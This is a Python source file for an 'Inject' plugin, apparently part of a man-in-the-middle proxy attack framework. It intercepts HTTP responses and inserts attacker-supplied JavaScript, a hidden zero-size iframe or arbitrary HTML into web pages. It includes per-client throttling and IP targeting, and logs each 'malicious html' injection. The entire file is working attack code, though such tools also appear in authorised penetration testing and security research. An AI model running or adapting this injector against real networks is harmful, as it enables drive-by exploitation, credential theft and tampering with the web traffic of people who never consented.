import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import get_if_addr
import time
import re
import sys
import argparse
from plugins.plugin import Plugin
from plugins.CacheKill import CacheKill


class Inject(CacheKill, Plugin):
    name = "Inject"
    optname = "inject"
    implements = ["handleResponse", "handleHeader", "connectionMade"]
    has_opts = True
    desc = "Inject arbitrary content into HTML content"

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options      = options
        self.html_src     = options.html_url
        self.js_src       = options.js_url
        self.rate_limit   = options.rate_limit
        self.count_limit  = options.count_limit
        self.per_domain   = options.per_domain
        self.black_ips    = options.black_ips
        self.white_ips    = options.white_ips
        self.match_str    = options.match_str
        self.html_payload = options.html_payload

        try:
            self.proxyip = get_if_addr(options.interface)
            if self.proxyip == "0.0.0.0":
                sys.exit("[-] Interface %s does not have an IP address" % options.interface)
        except Exception, e:
            sys.exit("[-] Error retrieving interface IP address: %s" % e)

        if self.white_ips:
            temp = []
            for ip in self.white_ips.split(','):
                temp.append(ip)
            self.white_ips = temp

        if self.black_ips:
            temp = []
            for ip in self.black_ips.split(','):
                temp.append(ip)
            self.black_ips = temp

        if self.options.preserve_cache:
            self.implements.remove("handleHeader")
            self.implements.remove("connectionMade")

        if options.html_file is not None:
            self.html_payload += options.html_file.read()

        self.ctable = {}
        self.dtable = {}
        self.count = 0
        self.mime = "text/html"
        print "[*] Inject plugin online"

    def handleResponse(self, request, data):
        #We throttle to only inject once every two seconds per client
        #If you have MSF on another host, you may need to check prior to injection
        #print "http://" + request.client.getRequestHostname() + request.uri
        ip, hn, mime = self._get_req_info(request)
        if self._should_inject(ip, hn, mime) and (not self.js_src == self.html_src is not None or not self.html_payload == ""):
            if hn not in self.proxyip: #prevents recursive injecting
                data = self._insert_html(data, post=[(self.match_str, self._get_payload())])
                self.ctable[ip] = time.time()
                self.dtable[ip+hn] = True
                self.count += 1
                logging.info("%s [%s] Injected malicious html" % (ip, hn))
                return {'request': request, 'data': data}
            else:
                return

    def _get_payload(self):
        return self._get_js() + self._get_iframe() + self.html_payload

    def add_options(self,options):
        options.add_argument("--js-url", type=str, help="Location of your (presumably) malicious Javascript.")
        options.add_argument("--html-url", type=str, help="Location of your (presumably) malicious HTML. Injected via hidden iframe.")
        options.add_argument("--html-payload", type=str, default="", help="String you would like to inject.")
        options.add_argument("--html-file", type=argparse.FileType('r'), default=None, help="File containing code you would like to inject.")
        options.add_argument("--match-str", type=str, default="</body>", help="String you would like to match and place your payload before. (</body> by default)")
        options.add_argument("--preserve-cache", action="store_true", help="Don't kill the server/client caching.")
        group = options.add_mutually_exclusive_group(required=False)
        group.add_argument("--per-domain", action="store_true", default=False, help="Inject once per domain per client.")
        group.add_argument("--rate-limit", type=float, default=None, help="Inject once every RATE_LIMIT seconds per client.")
        group.add_argument("--count-limit", type=int, default=None, help="Inject only COUNT_LIMIT times per client.")
        group.add_argument("--white-ips", type=str, default=None, help="Inject content ONLY for these ips")
        group.add_argument("--black-ips", type=str, default=None, help="DO NOT inject content for these ips")

    def _should_inject(self, ip, hn, mime):

        if self.white_ips is not None:
            if ip in self.white_ips:
                return True
            else:
                return False

        if self.black_ips is not None:
            if ip in self.black_ips:
                return False
            else:
                return True

        if self.count_limit == self.rate_limit is None and not self.per_domain:
            return True

        if self.count_limit is not None and self.count > self.count_limit:
            #print "1"
            return False

        if self.rate_limit is not None:
            if ip in self.ctable and time.time()-self.ctable[ip] < self.rate_limit:
                return False

        if self.per_domain:
            return not ip+hn in self.dtable

        #print mime
        return mime.find(self.mime) != -1

    def _get_req_info(self, request):
        ip = request.client.getClientIP()
        hn = request.client.getRequestHostname()
        mime = request.client.headers['Content-Type']
        return (ip, hn, mime)

    def _get_iframe(self):
        if self.html_src is not None:
            return '<iframe src="%s" height=0%% width=0%%></iframe>' % (self.html_src)
        return ''

    def _get_js(self):
        if self.js_src is not None:
            return '<script type="text/javascript" src="%s"></script>' % (self.js_src)
        return ''

    def _insert_html(self, data, pre=[], post=[], re_flags=re.I):
        '''
        To use this function, simply pass a list of tuples of the form:
        
        (string/regex_to_match,html_to_inject)
        
        NOTE: Matching will be case insensitive unless differnt flags are given
        
        The pre array will have the match in front of your injected code, the post
        will put the match behind it.
        '''
        pre_regexes = [re.compile(r"(?P<match>"+i[0]+")", re_flags) for i in pre]
        post_regexes = [re.compile(r"(?P<match>"+i[0]+")", re_flags) for i in post]

        for i, r in enumerate(pre_regexes):
            data = re.sub(r, "\g<match>"+pre[i][1], data)

        for i, r in enumerate(post_regexes):
            data = re.sub(r, post[i][1]+"\g<match>", data)

        return data
